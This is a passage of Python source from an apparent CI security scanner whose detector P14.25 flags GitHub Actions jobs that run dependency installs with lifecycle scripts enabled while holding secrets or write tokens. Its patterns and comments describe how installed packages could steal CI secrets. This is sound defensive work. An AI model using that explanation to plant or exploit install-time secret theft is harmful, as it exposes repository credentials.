        i += 1
    return True
# `secrets.NAME` in any of the job's own text. github.token is excluded: it is
# present in every job by construction, so treating it as a payoff would make
# the payoff leg vacuous — the catalog says "beyond github.token".
_SECRET_REF_RE = re.compile(r"secrets\.([A-Za-z_][A-Za-z0-9_-]*)")
_GITHUB_TOKEN_NAMES = {"github_token", "githubtoken"}


def _job_secret_refs(job: Any, doc: Any = None) -> list[str]:
    """Secret names in this job's ENVIRONMENT, excluding a bare GITHUB_TOKEN.

    Scans the job's serialized YAML text rather than specific keys: a secret
    reaches the install step's environment from `env:` at job or step scope,
    from a step's `with:`, or from inside a `run:` scalar, and enumerating
    those keys individually is how a payoff gets missed.

    Workflow-level `env:` counts too, and this is why `doc` is a parameter.
    GitHub merges the workflow's `env:` map into EVERY job's environment, so a
    `NPM_TOKEN: ${{ secrets.NPM_TOKEN }}` declared at the top of the file is
    just as present in the install step's process as one declared on the job —
    but the job's own subtree does not contain it, so the payoff leg read it as
    absent. facebook/react's `compiler_prereleases.yml` declares exactly that
    and its publish job was left unflagged. This mirrors how
    `_job_effective_write_scopes` already consults the workflow-level
    `permissions:` block. (`env:` MERGES, unlike `permissions:`, which
    replaces — so both scopes are read here, not one or the other.)
    """
    if not isinstance(job, dict):
        return []
    scopes: list[Any] = [job]
    if isinstance(doc, dict) and doc.get("env") is not None:
        scopes.append({"env": doc.get("env")})
    blob_parts: list[str] = []
    for scope in scopes:
        try:
            blob_parts.append(
                yaml.safe_dump(scope, default_flow_style=False, sort_keys=False)
            )
        except yaml.YAMLError:      # pragma: no cover - defensive
            blob_parts.append(str(scope))
    blob = "\n".join(blob_parts)
    names = []
    for name in _SECRET_REF_RE.findall(blob):
        if name.lower() in _GITHUB_TOKEN_NAMES:
            continue
        if name not in names:
            names.append(name)
    if isinstance(job.get("secrets"), str) and job["secrets"].strip() == "inherit":
        # A called workflow inheriting the caller's whole secret set is the
        # broadest payoff there is; it carries no `secrets.NAME` token to find.
        names.append("<secrets: inherit>")
    return names


def _write_scopes(perms: Any) -> list[str]:
    """`scope: write` names in a `permissions:` block, or [] .

    `permissions: write-all` (a string) is the whole set; `permissions: {}` and
    read-only blocks yield nothing, which is what makes the negative case
    silent rather than merely lower-severity.
    """
    if isinstance(perms, str):
        return ["write-all"] if perms.strip() == "write-all" else []
    if not isinstance(perms, dict):
        return []
    return [
        str(k) for k, v in perms.items()
        if isinstance(v, str) and v.strip().lower() == "write"
    ]


def _job_effective_write_scopes(doc: dict[str, Any], job: dict[str, Any]) -> list[str]:
    """Write scopes effective FOR THIS JOB.

    A job's own `permissions:` block replaces the workflow-level one outright
    (GitHub does not merge them), so the workflow block is only consulted when
    the job declares none. Reading both unconditionally would report a write
    scope a job that scoped itself down does not actually hold.

    An ABSENT `permissions:` block yields no write scope, deliberately. What
    the default `GITHUB_TOKEN` grants is a repository/organization setting,
    invisible in this YAML, and GitHub's own default for repositories created
    since 2023 is read-only — so treating silence as write would manufacture a
    payoff leg on the safe default and fire P14.25 on very nearly every repo
    that installs dependencies, which is the hygiene-check shape the catalog
    rejects for this pattern. (The asymmetry with the npm-v12 ruling above is
    the point: there the unknown default is the DANGEROUS one, so not firing
    would hide a live finding; here it is the safe one.) A permissive default
    token is not unreported — the `sec.permissions.workflow-declares` and
    `sec.permissions.write-scoped` config facts score exactly that, and P14.18
    flags where a write scope meets an untrusted trigger.
    """
    if "permissions" in job:
        return _write_scopes(job.get("permissions"))
    return _write_scopes(doc.get("permissions"))


def _strip_shell_comment(line: str) -> str:
    """`line` with any trailing shell comment removed, QUOTE-AWARE.

    A `#` only opens a comment when it is unquoted and starts a word — the
    shell's own rule. Cutting at the first `#` regardless truncated
    `npm install "github:user/repo#tag" --ignore-scripts` before its flag and
    reported a hardened install as a finding.
    """
    out: list[str] = []
    for ch, is_syntax in _shell_scan(line):
        if is_syntax and ch == "#" and (not out or out[-1].isspace()):
            break
        out.append(ch)
    return "".join(out)


def _shell_scan(text: str) -> Iterator[tuple[str, bool]]:
    """``(char, is_shell_syntax)`` for each character of a shell command.

    ``is_shell_syntax`` is False for anything the shell would read as DATA —
    inside quotes, or escaped by a backslash. Both callers below need exactly
    this distinction and they need to agree on it, so it is computed once:
    the bugs here have all been one reader treating as syntax what the other
    read as data. Backslash escapes apply unquoted and inside double quotes;
    inside single quotes nothing escapes, which is the shell's own rule.
    """
    quote: str | None = None
    i = 0
    n = len(text)
    while i < n:
        ch = text[i]
        if quote != "'" and ch == "\\" and i + 1 < n:
            yield ch, False
            yield text[i + 1], False
            i += 2
            continue
        if quote:
            yield ch, False
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in "'\"":
            quote = ch
            yield ch, False
            i += 1
            continue
        yield ch, True
        i += 1


def _install_command_segments(command: str) -> list[str]:
    """`command` split on its unquoted `;` `&` `&&` `|` `||` separators.

    Used by the P14.25 install detector, which must split on a bare `|` too:
    `--ignore-scripts` protects the command it is WRITTEN on, so in
    `npm ci --ignore-scripts | npm install` the flag covers the first command
    and the piped-to `npm install` is still an unprotected install. (This is a
    DIFFERENT question from `_pipeline_command_segments`, which keeps a pipeline
    whole because a `… | tee file` pipeline is one logical write.) The name was
    once shared between the two, and the pipeline-whole definition silently
    overrode this one — issue #278 — so a bare-pipe install was read as
    protected. They are two named functions now.

    Quote-aware for the same reason as the comment strip: splitting
    `npm install "a|b" --ignore-scripts` on the quoted pipe put the flag in a
    different segment from the install it protects, and the install was
    reported.
    """
    marked = list(_shell_scan(command))
    segments: list[str] = []
    current: list[str] = []
    i = 0
    while i < len(marked):
        ch, is_syntax = marked[i]
        if is_syntax and ch in ";&|":
            segments.append("".join(current))
            current = []
            nxt = marked[i + 1] if i + 1 < len(marked) else None
            i += 2 if nxt and nxt[1] and nxt[0] == ch else 1
            continue
        current.append(ch)
        i += 1
    segments.append("".join(current))
    return segments


def _shell_commands(lines: list[str]) -> Iterator[tuple[int, str, str]]:
    """``(line_no, verbatim first line, joined command text)`` per COMMAND.

    The unit of analysis is the shell command, not the source line, because a
    trailing backslash continues one command across several lines:

        npm install \\
          --ignore-scripts

    is a single hardened install, and judging its first line alone reports a
    finding the repository does not have. Comments are stripped before the
    continuation is read, and the reported line number / verbatim text stay
    those of the command's FIRST line, so the evidence still points a reader
    at the place the command starts.
    """
    idx = 0
    while idx < len(lines):
        first = idx
        parts: list[str] = []
        while True:
            stripped = _strip_shell_comment(lines[idx])
            parts.append(stripped.rstrip().rstrip("\\"))
            if stripped.rstrip().endswith("\\") and idx + 1 < len(lines):
                idx += 1
                continue
            break
        yield first + 1, lines[first], " ".join(parts)
        idx += 1


def _is_unprotected_install(command: str) -> bool:
    """Does this shell command line run an install with lifecycle scripts on?

    The single definition of "unprotected install" — the job-level gate and
    the evidence lookup both call it. They used to ask the question at
    different granularities: the gate searched a whole `run:` scalar, so a
    scalar holding `npm ci --ignore-scripts` on one line and a plain
    `npm install` on the next was read as protected and the job was dropped,
    and a `--ignore-scripts` written in a shell COMMENT suppressed the real
    install below it. One definition cannot disagree with itself that way.

    `--ignore-scripts` is matched against the SEGMENT it belongs to, not the
    whole line: it protects the command it is written on. `command` is split by
    `_install_command_segments`, which breaks on `;` `&` `&&` `||` AND a bare
    `|`, so in both `npm ci --ignore-scripts && npm install` and
    `npm ci --ignore-scripts | npm install` the flag covers only the first
    command and the second install is a finding.

    A global or single-package install is not this vector and is excluded here
    too — see `_is_dependency_tree_install`.
    """
    return any(
        _INSTALL_CMD_RE.search(seg)
        and not _IGNORE_SCRIPTS_RE.search(seg)
        and _is_dependency_tree_install(seg)
        for seg in _install_command_segments(command)
    )


def _scalar_has_unprotected_install(scalar: str) -> bool:
    """Any command in this `run:` scalar an unprotected install."""
    return any(
        _is_unprotected_install(cmd)
        for _line, _raw, cmd in _shell_commands(scalar.splitlines())
    )


# The quotes are optional because `- "run": npm ci` is legal YAML and means
# exactly `- run: npm ci`. Without them the step is not recognised as shell at
# all, and the install inside it stops being reportable.
_RUN_KEY_LINE_RE = re.compile(r"""^(\s*)(?:-\s+)?["']?run["']?\s*:\s*(.*)$""")
_BLOCK_SCALAR_RE = re.compile(r"^[|>][+-]?\d*\s*(#.*)?$")


def _run_scalar_line_numbers(text: str) -> set[int]:
    """1-based line numbers whose content is SHELL — inside a `run:` scalar.

    Everything else in a workflow file is YAML, and a regex hunting for install
    commands does not belong there. Without this, `- name: Run pnpm install`
    matched the install regex and the evidence quoted a step NAME as if it were
    the command (immich's f7/f8/f11 all quoted `- name: Run pnpm install`), and
    a `#` comment mentioning an install could do the same.

    Two forms are recognised: an inline scalar (`run: pnpm install`), whose own
    line is shell; and a block scalar (`run: |`), whose shell is every
    following line indented deeper than the `run:` key.
    """
    shell: set[int] = set()
    lines = text.splitlines()
    i = 0
    while i < len(lines):
        m = _RUN_KEY_LINE_RE.match(lines[i])
        if m is None:
            i += 1
            continue
        indent = len(m.group(1))
        rest = m.group(2).strip()
        if rest and not _BLOCK_SCALAR_RE.match(rest):
            # Inline scalar. It may still continue onto more-indented lines
            # (plain multi-line YAML scalars), which are shell as well.
            shell.add(i + 1)
            j = i + 1
            while j < len(lines):
                nxt = lines[j]
                if not nxt.strip():
                    break
                if len(nxt) - len(nxt.lstrip()) <= indent:
                    break
                shell.add(j + 1)
                j += 1
            i = j
            continue
        # Block scalar: consume the indented body (blank lines included).
        j = i + 1
        while j < len(lines):
            nxt = lines[j]
            if nxt.strip() and len(nxt) - len(nxt.lstrip()) <= indent:
                break
            if nxt.strip():
                shell.add(j + 1)
            j += 1
        i = j
    return shell


def _run_scalar_starts(text: str) -> set[int]:
    """1-based line numbers where a `run:` scalar's shell BEGINS.

    The companion to `_run_scalar_line_numbers`, which answers "is this line
    shell" but not "is this line a different step's shell". Line adjacency
    cannot answer the second question in either direction: two inline
    `- run:` steps are adjacent lines in different steps, and a blank line
    inside one block scalar makes one step's shell non-adjacent. Anything that
    dies with its step — the working directory above all — has to key off this
    set instead.
    """
    starts: set[int] = set()
    lines = text.splitlines()
    shell = _run_scalar_line_numbers(text)
    for i, line in enumerate(lines):
        m = _RUN_KEY_LINE_RE.match(line)
        if m is None:
            continue
        rest = m.group(2).strip()
        if rest and not _BLOCK_SCALAR_RE.match(rest):
            starts.add(i + 1)             # inline scalar: the key's own line
            continue
        for j in range(i + 1, len(lines) + 1):   # block scalar: its first body line
            if j + 1 in shell:
                starts.add(j + 1)
                break
    return starts


# `<<WORD` / `<<-'WORD'` — a heredoc opener.
#
# The lookarounds are load-bearing. `<<<` is a here-STRING: it carries its whole
# value on the line and opens no body. Without `(?!<)` the search simply retried
# at the second `<` and matched `<< abc` inside `sort <<< abc`, which suppressed
# every command to the end of the step — losing real findings, silently.
_HEREDOC_OPEN_RE = re.compile(r"(?<!<)<<(?!<)-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1")


def _heredoc_delimiter(command: str) -> str | None:
    """The word ending the here-doc this command opens, or None.

    The OPERATOR has to be shell syntax, the DELIMITER does not:
    `echo "use << EOF for heredocs"` mentions a here-doc inside a quoted string
    and opens nothing, while `cat <<'EOF'` quotes its delimiter and opens one —
    quoting the delimiter is the idiom, since it stops expansion in the body.
    So the quote test is applied to the `<<` itself, using the syntax/data
    split this file already computes once in `_shell_scan`, and the delimiter
    is read from the raw text. Blanking all quoted text instead would miss
    every `<<'EOF'` in the corpus.
    """
    syntax = [is_syntax for _ch, is_syntax in _shell_scan(command)]
    for match in _HEREDOC_OPEN_RE.finditer(command):
        at = match.start()
        if at + 1 < len(syntax) and syntax[at] and syntax[at + 1]:
            return match.group(2)
    return None


def _install_line(
    text: str, job_range: tuple[int, int] | None
) -> tuple[int, str, str] | None:
    """(line_no, verbatim line, joined command) of the QUALIFYING install.

    Scoped to the job's own source range, so the evidence quotes the actual
    command instead of a synthesized sentence, and to `run:` scalar content, so
    it quotes shell rather than a step name or a comment. It returns the first
    command that would itself make the job a finding — not the first line the
    install regex happens to touch. leonardo's job bootstraps with
    `npm install -g npm@11` on one line and runs the real `pnpm install` at
    :31; the evidence used to quote the bootstrap, so the reader was pointed at
    a command that is not the vector and could not be fixed by the recipe.
    A command carrying `--ignore-scripts` is skipped here as well as at the job
    level: a job that fixed one install and left another still has the unfixed
    one quoted.
    """
    found = _install_lines(text, job_range)
    return found[0] if found else None


def _install_lines(
    text: str, job_range: tuple[int, int] | None
) -> list[tuple[int, str, str]]:
    """EVERY qualifying install in the job, in source order.

    A job can install more than once, and the build allowlist can be a
    different thing at each of them — disabled above the first, put back before
    the second. Deciding mitigation on the first install alone gets both
    directions wrong: it suppressed a job whose later install was exposed, and
    it reported a job whose install was disabled by a step further down.
    """
    lines = text.splitlines()
    shell_lines = _run_scalar_line_numbers(text)
    start, end = job_range if job_range else (1, len(lines))
    out = []
    for line_no, raw, cmd in _shell_commands(lines):
        if line_no < start or line_no > min(end, len(lines)):
            continue
        if line_no not in shell_lines:
            continue
        if _is_unprotected_install(cmd):
            out.append((line_no, raw, cmd))
    return out


# --- P14.25 mitigation signals -----------------------------------------------
#
# The catalog used to assert, in every finding, that the job "runs this install
# with dependency lifecycle scripts enabled". That is not knowable from workflow
# YAML and for pnpm it is usually FALSE: pnpm 10 and later block dependency
# lifecycle scripts by default and only run them for packages named in
# `onlyBuiltDependencies` / `allowBuilds`. So the note now says what IS knowable
# — the install executes lifecycle scripts UNLESS the manager's version or
# configuration disables them — and names the per-manager condition.
#
# Two tiers of in-repo evidence, and the split is deliberate:
#
#   HARD (no finding at all) — a step in the SAME job, ordered BEFORE the
#   install, that empties or falsifies the build allowlist, together with a
#   `packageManager` pin resolving pnpm >= 10 (the mechanism only exists there).
#   vitejs/vite writes `yq '.allowBuilds[]=false' -i pnpm-workspace.yaml`
#   immediately above `pnpm install` in both its release and its publish
#   workflow; reporting those was a false positive twice over.
#
#   PARTIAL (the finding STANDS, with the mitigation named in its note) — a
#   committed `pnpm-workspace.yaml` allowlist, or a pnpm >= 10 pin on its own.
#   A committed file is not proof of the file at install time: vite's own
#   release jobs rewrite it mid-run, which is the counter-example. And a pin
#   with a NON-empty allowlist means scripts still run for the allow-listed
#   packages (vercel/next.js allows `@ast-grep/cli`). Suppressing on either
#   would be the false-negative shape the NEVER rules ban, so both are
#   disclosed rather than acted on.
_PACKAGE_MANAGER_PIN_RE = re.compile(
    r"\"packageManager\"\s*:\s*\"(npm|pnpm|yarn)@((\d+)[^\"+]*)"
)
_ALLOWLIST_KEY_RE = re.compile(r"(allowBuilds|onlyBuiltDependencies)")
_ALLOWLIST_DISABLE_RE = re.compile(
    r"(allowBuilds|onlyBuiltDependencies)\s*(?:\[\s*\])?\s*[:=]\s*"
    r"(?:false|\[\s*\]|\{\s*\})"
)
# A `#` that starts a shell comment: at the start of the line or after
# whitespace. Everything from there on is inert text, not an executed command.
_COMMENT_TAIL_RE = re.compile(r"(?:^|\s)#.*$")
# The config file a real disable-the-builds step writes.
_ALLOWLIST_TARGET = r"[^\s'\"]*(?:pnpm-workspace\.ya?ml|package\.json|\.npmrc)"
# The three ways a line actually WRITES that file. Each binds the write to the
# target in ONE expression, because testing "names a config file" and "has a
# redirect" independently accepts lines where the two are unrelated:
# `yq '.allowBuilds[]=false' pnpm-workspace.yaml > /dev/null` reads the file
# and writes to the bit bucket, changing nothing. Naming the file is not
# enough either — the same command without `-i` just prints the edited
# document. vitejs/vite's real step is
# `yq '.allowBuilds[]=false' -i pnpm-workspace.yaml`.
_ALLOWLIST_WRITE_RES = (
    # in-place edit of the target: `yq … -i pnpm-workspace.yaml`, `sed -i … pkg`.
    # Gated on the command being one that HAS an in-place mode: `-i` means
    # case-insensitive to grep, so `grep -i allowBuilds=false
    # pnpm-workspace.yaml` is a read-only check that would otherwise read as a
    # mutation.
    re.compile(r"\b(?:yq|sed|perl|dasel|sponge|crudini)\b.*"
               r"(?:^|\s)(?:-i|--in-?place)(?:=\S*)?(?:\s+\S+)*?\s+"
               + _ALLOWLIST_TARGET + r"(?:\s|$)"),
    # redirect or tee INTO the target: `… >> pnpm-workspace.yaml`
    re.compile(r"(?:>>?\s*|\|\s*tee\s+(?:-a\s+)?)" + _ALLOWLIST_TARGET),
    # the package manager's own writer — bound to the allowlist key, or an
    # unrelated `pnpm config set registry …` on the same line as inert disable
    # text would read as a mitigation.
    re.compile(r"pnpm\s+config\s+set\s+\S*"
               r"(?:allowBuilds|onlyBuiltDependencies)"),
)
# A line that only PRINTS: `echo`/`printf` with nothing to write into. Its
# argument can quote an entire real mitigation, so the write test above cannot
# tell it apart on its own.
_INERT_PRINT_RE = re.compile(r"^(?:echo|printf)\b(?![^>]*(?:>|\|\s*tee\b))")


def _writes_the_build_allowlist(code: str) -> bool:
    """Does this shell line actually WRITE the build allowlist it mentions?"""
    return any(r.search(code) for r in _ALLOWLIST_WRITE_RES)


def _repo_root_for_workflow(file_path: Path) -> Path | None:
    """The repo root a `.github/workflows/<f>.yml` path sits in, or None."""
    parts = file_path.resolve().parts
    if len(parts) < 4 or parts[-2] != "workflows" or parts[-3] != ".github":
        return None
    return Path(*parts[:-3])


def _package_manager_pin(root: Path | None) -> tuple[str, int, str] | None:
    """`(manager, major, version)` from the repo's `packageManager` field.

    The full version travels with the major because the note quotes it: a
    reader told "this repo pins `pnpm@10`" cannot check that against a
    `package.json` that says `pnpm@10.33.0`.
    """
    if root is None:
        return None
    try:
        blob = (root / "package.json").read_text(encoding="utf-8", errors="replace")
    except OSError:
        return None
    m = _PACKAGE_MANAGER_PIN_RE.search(blob)
    if m is None:
        return None
    return m.group(1), int(m.group(3)), m.group(2)


def _pnpm_build_allowlist(root: Path | None) -> str | None:
    """``"restrictive"`` / ``"permissive"`` / None for the repo's build
    allowlist.

    ``restrictive`` means the declaration exists and permits NOTHING to build
    (an empty list, or a map whose every value is falsy — vitejs/vite ships
    `allowBuilds: {core-js: false, vue-demi: false}`). ``permissive`` means at
    least one package may build (vercel/next.js allows `@ast-grep/cli`).

    Two files can hold the declaration, and BOTH are read, in pnpm's own order
    of precedence: `pnpm-workspace.yaml` first, then `package.json`'s
    `pnpm.onlyBuiltDependencies` — which is where adobe/leonardo declares it,
    and reading only the workspace file left that repo's finding saying the
    allowlist was undeclared when the repo declares it. This changes NOTE
    SPECIFICITY only: the allowlist never suppresses a finding on its own (that
    takes an in-job write; see `_allowlist_writes`).
    """
    if root is None:
        return None

    def _verdict(value: Any) -> str | None:
        if isinstance(value, dict):
            return "permissive" if any(value.values()) else "restrictive"
        if isinstance(value, list):
            return "permissive" if value else "restrictive"
        return None

    for name in ("pnpm-workspace.yaml", "pnpm-workspace.yml"):
        try:
            text = (root / name).read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        try:
            doc = yaml.safe_load(text)
        except yaml.YAMLError:
            return None
        if not isinstance(doc, dict):
            break
        for key in ("allowBuilds", "onlyBuiltDependencies"):
            if key in doc:
                verdict = _verdict(doc.get(key))
                if verdict is not None:
                    return verdict
        break

    # `package.json` → `"pnpm": {"onlyBuiltDependencies": [...]}`.
    try:
        blob = (root / "package.json").read_text(encoding="utf-8", errors="replace")
    except OSError:
        return None
    try:
        pkg = json.loads(blob)
    except json.JSONDecodeError:
        return None
    if not isinstance(pkg, dict):
        return None
    pnpm_cfg = pkg.get("pnpm")
    if not isinstance(pnpm_cfg, dict):
        return None
    for key in ("onlyBuiltDependencies", "allowBuilds"):
        if key in pnpm_cfg:
            return _verdict(pnpm_cfg.get(key))
    return None


def _allowlist_writes(
    text: str, job_range: tuple[int, int] | None
) -> list[tuple[int, bool, str]]:
    """Every EXECUTED write to the build allowlist in this job, in order:
    ``(line_no, disables, verbatim line)``.

    This is the one thing that suppresses a P14.25 finding OUTRIGHT, so the
    line has to be an executed mutation of the package manager's build
    allowlist and not merely text that mentions one. Two inert shapes reached
    the unconditional suppression before this gate: a shell COMMENT
    (`# allowBuilds=false — set in pnpm-workspace.yaml`, a perfectly natural
    thing to write) and an echoed string with nowhere to go
    (`echo 'allowBuilds: false'`). A third, subtler one: `yq
    '.allowBuilds[]=false' pnpm-workspace.yaml` WITHOUT `-i` names the file but
    only prints the edited document — the file on disk is untouched. Each
    silenced a genuine privileged install. So the mitigation must survive
    comment-stripping, name the config, AND write it — which is what a real
    mitigation does: vitejs/vite runs
    `yq '.allowBuilds[]=false' -i pnpm-workspace.yaml`.

    All three tests run per COMMAND, not per line. Run against a whole line
    they can be satisfied by different commands that have nothing to do with
    each other: `echo allowBuilds=false; pnpm config set registry … > .npmrc`
    has inert disable text in one command and an unrelated write in the next,
    and passed every line-level gate.

    The ORDER is what the caller needs. A job can turn the allowlist off and
    back on around several installs, and only the last write before a given
    install decides whether that install is protected. Answering "does a
    disable appear anywhere above" gets it wrong in both directions: it
    suppressed a job whose later install was exposed, and it reported a job
    whose install was disabled by a step further down.
    """
    lines = text.splitlines()
    shell_lines = _run_scalar_line_numbers(text)
    start, end = job_range if job_range else (1, len(lines))
    writes: list[tuple[int, bool, str]] = []
    for idx in range(max(start, 1), min(end, len(lines)) + 1):
        if idx not in shell_lines:
            continue
        raw = lines[idx - 1]
        for whole in _pipeline_command_segments(_COMMENT_TAIL_RE.sub("", raw)):
            # `NOTE="pnpm config set allowBuilds=false"` stores a string; it
            # runs nothing. Leading `VAR=value` assignments are stripped, and a
            # segment that is ONLY assignments is not a command at all.
            seg = _command_after_assignments(whole)
            if not seg.strip():
                logger.debug(
                    "P14.25: line %d assigns allowlist-shaped text but runs "
                    "no command — not a mitigation: %s", idx, raw.strip(),
                )
                continue
            if not _ALLOWLIST_KEY_RE.search(seg):
                continue
            if not _writes_the_build_allowlist(seg):
                logger.debug(
                    "P14.25: line %d mentions a build allowlist but does not "
                    "write it — not a mitigation: %s", idx, raw.strip(),
                )
                continue
            if _INERT_PRINT_RE.match(seg.strip()):
                # `echo "yq '.allowBuilds[]=false' -i pnpm-workspace.yaml"`
                # prints a mitigation instead of running one, and the quoted
                # `-i` would otherwise satisfy the write test.
                logger.debug(
                    "P14.25: line %d only PRINTS an allowlist mutation — not "
                    "a mitigation: %s", idx, raw.strip(),
                )
                continue
            # A write that is not a disable re-opens the allowlist.
            writes.append(
                (idx, bool(_ALLOWLIST_DISABLE_RE.search(seg)), raw.strip())
            )
    return writes


def _builds_disabled_at(
    writes: list[tuple[int, bool, str]], install_line: int
) -> str | None:
    """The verbatim line that leaves builds disabled at `install_line`, if the
    LAST allowlist write above it is a disable."""
    prior = [w for w in writes if w[0] < install_line]
    if prior and prior[-1][1]:
        return prior[-1][2]
    return None


_SHELL_SEGMENT_RE = re.compile(r"(?:;|&&|\|\||&(?!&))")
# Single quotes take no escapes in shell; double quotes do, so a `\"` inside
# one must not end the span — otherwise the rest of the string is treated as
# bare shell and a quoted `;` becomes a command boundary again.
_QUOTED_RUN_RE = re.compile(r"'[^']*'|\"(?:\\.|[^\"\\])*\"")
# A leading `VAR=value` (optionally `export`ed). Shell runs the command AFTER
# these; a segment made only of them runs nothing at all.
_LEADING_ASSIGNMENT_RE = re.compile(
    r"^\s*(?:export\s+)?[A-Za-z_][A-Za-z0-9_]*="
    r"(?:'[^']*'|\"(?:\\.|[^\"\\])*\"|\S*)\s*"
)


def _command_after_assignments(segment: str) -> str:
    """`FOO=1 BAR="x" yq …` → `yq …`; `NOTE="…"` → `` (it runs nothing)."""
    prev = None
    out = segment
    while out != prev:
        prev = out
        out = _LEADING_ASSIGNMENT_RE.sub("", out, count=1)
    return out


def _pipeline_command_segments(line: str) -> list[str]:
    """One shell line split into the commands it actually runs.

    A bare `|` is NOT a separator here: a pipeline is one logical command, and
    `echo 'allowBuilds: false' | tee -a pnpm-workspace.yaml` really does write
    the file. (The P14.25 install detector wants the opposite — see
    `_install_command_segments` — which is why these are two named functions.)

    Quote-aware, because splitting blind cuts BOTH ways: `echo "note; pnpm
    config set allowBuilds=false"` is one `echo` of inert text, but a naive
    split on `;` manufactures a second "command" that satisfies every
    mitigation test and silences the install below it. Separators are located
    on a copy with quoted spans masked, then the ORIGINAL text is sliced at
    those offsets so each segment keeps its real content.
    """
    masked = _QUOTED_RUN_RE.sub(lambda m: "x" * len(m.group(0)), line)
    out, prev = [], 0
    for m in _SHELL_SEGMENT_RE.finditer(masked):
        out.append(line[prev:m.start()])
        prev = m.end()
    out.append(line[prev:])
    return [s for s in out if s.strip()]


def _manager_condition_note(
    manager: str | None,
    command: str,      # every `run:` scalar in the job, joined
    pin: tuple[str, int, str] | None,
    allowlist: str | None,
) -> str:
    """The per-manager sentence: under what condition do scripts actually run?

    Per-manager because the single npm-v12 caveat rendered on `pnpm` and `yarn`
    findings too, where it contradicted itself — three QA batches flagged the
    same self-contradiction.
    """
    if manager == "npm":
        # Bounded on the left so `pnpm@10` is not read as `npm@10`.
        pinned = re.search(r"(?<![\w.-])npm@[\^~]?(\d+)", command)
        if pinned:
            version = (
                f"this job installs npm {pinned.group(1)} explicitly, and that "
                f"major still runs them"
            )
        elif pin and pin[0] == "npm":
            version = (
                f"this repo pins `npm@{pin[2]}` via `packageManager`, and that "
                f"major "
                + ("does not run them by default" if pin[1] >= 12
                   else "still runs them")
            )
        else:
            version = (
                "the npm major your runner resolves is not visible in this "
                "YAML, so confirm it before treating this as closed"
            )
        return (
            "npm runs dependency `preinstall`/`install`/`postinstall` scripts "
            "by default through npm 11; npm v12 (announced 2026-06-09, shipped "
            f"2026-07-08) turns them off by default — {version}."
        )
    if manager == "pnpm":
        base = (
            "pnpm 9 and earlier run dependency lifecycle scripts by default; "
            "pnpm 10 and later block them unless the package is allow-listed "
            "in `onlyBuiltDependencies` / `allowBuilds`"
        )
        signals: list[str] = []
        if pin and pin[0] == "pnpm":
            signals.append(
                f"this repo pins `pnpm@{pin[2]}` via `packageManager`")
        if allowlist == "permissive":
            signals.append(
                "and its committed allowlist still permits at least one "
                "package to build, so scripts run for those"
            )
        elif allowlist == "restrictive":
            signals.append(
                "and its committed allowlist permits nothing to build — but a "
                "committed file is not the file at install time, so confirm no "
                "step rewrites it"
            )
        if signals:
            return base + " — " + " ".join(signals) + "."
        return (
            base + " — which major your runner resolves is not visible in this "
            "YAML, so confirm it before treating this as closed."
        )
    if manager == "yarn":
        if pin and pin[0] == "yarn":
            era = (
                "Classic, which runs them" if pin[1] < 2
                else "Berry, where the `enableScripts` setting governs them"
            )
            return (
                "Yarn Classic (1.x) runs dependency lifecycle scripts by "
                "default; Yarn Berry (2+) is governed by its `enableScripts` "
                f"setting — this repo pins `yarn@{pin[2]}` via "
                f"`packageManager`, i.e. {era}."
            )
        return (
            "Yarn Classic (1.x) runs dependency lifecycle scripts by default; "
            "Yarn Berry (2+) is governed by its `enableScripts` setting — "
            "which line your runner resolves is not visible in this YAML, so "
            "confirm it before treating this as closed."
        )
    return (      # pragma: no cover - defensive
        "whether the install runs dependency lifecycle scripts depends on the "
        "package manager version and configuration your runner resolves."
    )


def _job_run_texts(job: Any) -> list[str]:
    if not isinstance(job, dict):
        return []
    steps = job.get("steps")
    if not isinstance(steps, list):
        return []
    return [
        s["run"] for s in steps
        if isinstance(s, dict) and isinstance(s.get("run"), str)
    ]


def _correlation_install_scripts_in_privileged_job(
    file_path: Path,
) -> Iterator[RawHit]:
    """P14.25 — a dependency install that runs lifecycle scripts, in a job that
    holds secrets or a write-scoped token.

    Two conditions in ONE job: (1) a `run:` step invokes a package-manager
    install that executes `preinstall`/`install`/`postinstall` scripts —
    matched WITHOUT `--ignore-scripts`; (2) that job carries a live payoff —
    any `secrets.*` reference beyond `github.token`, `secrets: inherit`, or a
    write scope effective for the job. Either alone is not a finding: an
    install with nothing to steal hands the attacker nothing, and a
    credential-bearing job that never installs untrusted code is a different
    (non-)vector. One hit per qualifying job.

    The install leg is a DEPENDENCY-TREE install only — a global tool bootstrap
    (`npm i -g corepack@0.31`) or a named single-package install is excluded;
    see `_is_dependency_tree_install`.

    Which manager version a runner resolves is NOT knowable from workflow YAML,
    so this detector does not quietly stand down on the platform defaults — it
    fires and the derived note names the per-manager condition. Silently not
    firing on an unverifiable assumption is the false-negative shape the NEVER
    rules ban. It DOES stand down on hard, in-job evidence of disablement; see
    the mitigation-signal comment above `_repo_root_for_workflow`.
    """
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    ranges = {name: (start, end) for name, start, end in job_line_ranges(file_path)}
    root = _repo_root_for_workflow(file_path)
    pin = _package_manager_pin(root)
    allowlist = _pnpm_build_allowlist(root)
    for job_name, job in _walk_jobs(doc):
        runs = _job_run_texts(job)
        if not any(_scalar_has_unprotected_install(r) for r in runs):
            continue
        secrets = _job_secret_refs(job, doc)
        writes = _job_effective_write_scopes(doc, job)
        if not secrets and not writes:
            continue
        candidates = _install_lines(text, ranges.get(job_name))
        found = candidates[0] if candidates else None
        if found is None:
            # The parsed scalar matched but no raw line did (a folded scalar).
            # Reported as a coverage gap rather than dropped silently.
            _DROPPED_MATCHES.append({
                "kind": _KIND_UNANCHORED,
                "file": str(file_path),
                "reason": (
                    f"P14.25: jobs.{job_name} runs a script-executing install "
                    f"but the command line could not be located in the raw "
                    f"file (folded scalar?) — this match is NOT reported"
                ),
            })
            continue
        line, raw, command = found
        manager = _install_manager(command)

        # HARD evidence of disablement — an in-job step that empties the build
        # allowlist before the install, on a repo that pins pnpm >= 10 (where
        # that allowlist is the mechanism). No finding at all; asserting one
        # here would be a false positive against the repo's own mitigation.
        if manager == "pnpm" and pin and pin[0] == "pnpm" and pin[1] >= 10:
            allowlist_writes = _allowlist_writes(text, ranges.get(job_name))
            # Mitigation is decided PER INSTALL, by the last allowlist write
            # above it — a job can turn builds off, install, put them back and
            # install again. Report the first install that is exposed, so the
            # evidence quotes a command the reader can actually act on; if
            # every install in the job is covered, there is no finding.
